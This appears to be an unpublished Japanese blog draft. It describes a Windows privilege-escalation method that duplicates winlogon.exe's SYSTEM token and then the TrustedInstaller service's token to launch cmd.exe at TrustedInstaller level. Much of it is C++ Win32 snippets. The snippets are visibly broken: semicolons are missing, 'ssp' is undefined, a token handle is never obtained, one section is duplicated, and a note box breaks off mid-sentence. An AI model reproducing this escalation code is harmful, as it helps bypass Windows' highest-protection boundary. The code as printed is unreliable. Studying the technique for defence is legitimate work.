---
title: "最高権限(TrustedInstaller)でプロセスを起動する方法とコード"
emoji: "🦔"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["セキュリティ", "windows", "cpp"]
published: false
---

セキュリティの勉強で学んだトークン偽装攻撃について実際のコードと一緒に備忘録として残します。
Windowsにはプロセスのアクセス管理の仕組みとしてアクセストークンという手法を用いています。
各プロセスにはアクセス権限情報を持ったアクセストークンが割り当てられており、対応する権限があれば複製をすることができます。
トークン偽装攻撃は自プロセスよりも高い権限が付与されたアクセストークンを複製し、
自プロセスに割り当てることでWindowsの最高権限であるTrustedInstallerに昇格することを指します。
以下コードはすべてC++で、呼んでいる関数はすべてWin32 APIのものになります。

## 用語の解説

### プライマリアクセストークン

ユーザーの権限(セキュリティコンテキスト)が記録されたトークン。
ユーザーが起動するプロセスはプライマリアクセストークンが付与されて実行します。
また、子プロセスは親プロセスのトークンを継承するので、

### 　偽装トークン

Windowsには仕様として他のユーザーのセキュリティコンテキストを持ったトークンを利用してスレッドを実行することができる機能が提供されています。
これを偽装トークンと呼びます。
以下にさらに詳しく説明されています。
<https://github.com/windows-internals-guide/security/blob/57920913cfe745baf728aa488efa7a5e43dad069/7.4.2.d_%E5%81%BD%E8%A3%85.MD>
<https://github.com/windows-internals-guide/security/blob/57920913cfe745baf728aa488efa7a5e43dad069/7.6.3_%E5%BC%B7%E5%8A%9B%E3%81%AA%E7%89%B9%E6%A8%A9.MD>

## 昇格までの流れ

1. SYSTEM権限で起動しているプロセスからアクセストークンを複製
1. 現在のプロセスに複製したアクセストークンを付与
1. SYSTEM権限でTrustedInstaller.exeを起動する。
1. 起動したTrustedInstaller.exeのアクセストークンを複製
1. 複製したアクセストークンを付与した新しいプロセスを起動する。
1. プロセスがTrustedInstaller権限で起動する。

## SYSTEM権限で起動しているプロセスからアクセストークンを複製

Windowsのログオン機能をつかさどるwinlogon.exeはSYSTEM権限で起動されています。
そのため、winlogon.exeにはSYSTEM権限のアクセストークンが紐づけられています。
以下関数を利用してwinlogon.exeのアクセストークンを偽装トークン(TokenImpersonation)としてコピーします。
そのあと複製した偽装トークンを現在のプロセスに割り当てます。

> [!NOTE]
> 偽装トークンとは？
> 偽装トークンとはWindowsに備わった
>

```cpp
 // winlogon.exeのプロセスのハンドルを取得。(pidはwinlogon.exeのプロセスID)
 HANDLE hProcessWinlogon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
 // winlogon.exeのプロセスハンドルからアクセストークンのハンドルを取得
 HANDLE hTokenWinlogon;
 OpenProcessToken(hProcessWinlogon, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hTokenWinlogon); 
 //DuplicateProcessToken関数を使用してして偽装トークンとして複製し、ハンドルを取得。
 HANDLE hImpersonationToken;
 DuplicateTokenEx(hTokenWinlogon, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TOKEN_TYPE::TokenImpersonation, &hImpersonationToken)
```

## 現在のプロセスに複製したアクセストークンを付与

後述するTrustedInstallerサービスを起動するために、複製したSYSTEM権限を持つアクセストークンを自プロセスに付与することで自プロセスをSYSTEM権限に昇格させます。

```cpp
 // 現在のプロセスのハンドルを取得
 HANDLE hCurrentThread = GetCurrentThread();
 // 複製したアクセストークンを現在のスレッドに割り当てる。
 // hImpersonationTokenには前項で複製したwinlogin.exeのアクセストークンのハンドルが入る
 SetThreadToken(&hCurrentThread, hImpersonationToken);
 // ここから先では使用しないのでクローズ
 CloseHandle(hCurrentThread);
 CloseHandle(hImpersonationToken);
```

## TrustedInstaller.exeを起動する

TrustedInstallerサービスを起動することによってTrustedInstaller.exeを実行させます。
このプロセスにはTrustedInstallerのアクセストークンが付与されているので、後でアクセストークンを複製します。

```cpp
// TrustedInstaller サービスの起動
SC_HANDLE hTrustedInstallerService = OpenServiceW(OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS), L"trustedinstaller", MAXIMUM_ALLOWED);
 SERVICE_STATUS_PROCESS ssp = {};
 DWORD pcbBytesNeeded;
 QueryServiceStatusEx(hTrustedInstallerService, SC_STATUS_PROCESS_INFO, (BYTE*)&ssp, sizeof(ssp), &pcbBytesNeeded)
```

## 起動したTrustedInstaller.exeのアクセストークンを複製

TrustedInstallerに昇格するにはTrustedInstaller権限のアクセストークンが付与されているプロセスが必要です。
WindowsのTrustedInstallerサービスはSYSTEM権限で起動することができ、そのプロセスのアクセストークンにはTrustedInstallerの権限が付与されています。
それを利用して起動したTrustedInstaller.exeからアクセストークンを複製します。

TrustedInstaller サービスの起動

```cpp
// TrustedInstaller サービスの起動
SC_HANDLE hTrustedInstallerService = OpenServiceW(OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS), L"trustedinstaller", MAXIMUM_ALLOWED);
SERVICE_STATUS_PROCESS lpBuffer = {};
DWORD pcbBytesNeeded;
// サービスの状況を問い合わせ。lpBufferにサービス情報が入り、lpBuffer.dwProcessIdにプロセスIDが格納される。
QueryServiceStatusEx(hTrustedInstallerService, SC_STATUS_PROCESS_INFO, (BYTE*)&lpBuffer, sizeof(ssp), &pcbBytesNeeded)
```

trustedinstaller.exeのトークンを複製

```cpp
// TrustedInstaller.exeのアクセストークン 
// 複製したのアクセストークン
HANDLE hTruestedInstallerToken;
HANDLE hPrimaryToken;
DuplicateTokenEx(hTruestedInstallerToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TOKEN_TYPE::TokenPrimary, &hImpersonationToken)

```

## プロセスがTrustedInstaller権限で起動する

あとは作成するプロセスにTrustedInstallerの権限を付与するだけです。

```cpp
// コマンドプロンプト
const LPCWSTR targetExecutable = L"C:\\Windows\\System32\\cmd.exe";
STARTUPINFO si = {};
PROCESS_INFORMATION pi = {};
// コマンドプロンプトをTrustedInstaller権限のアクセストークンを付与して起動する。
// hTruestedInstallerToken前項で複製したTrustedinstaller.exeのアクセストークン
CreateProcessWithTokenW(hTruestedInstallerToken, LOGON_NETCREDENTIALS_ONLY, targetExecutable, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
```

全体のソースコードは以下にあります。
<https://github.com/takafumiokamoto/RunAsTrustedInstaller>

## 参考記事

<https://book.hacktricks.xyz/v/jp/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>
<https://blog.nflabs.jp/entry/2021/12/20/094644>
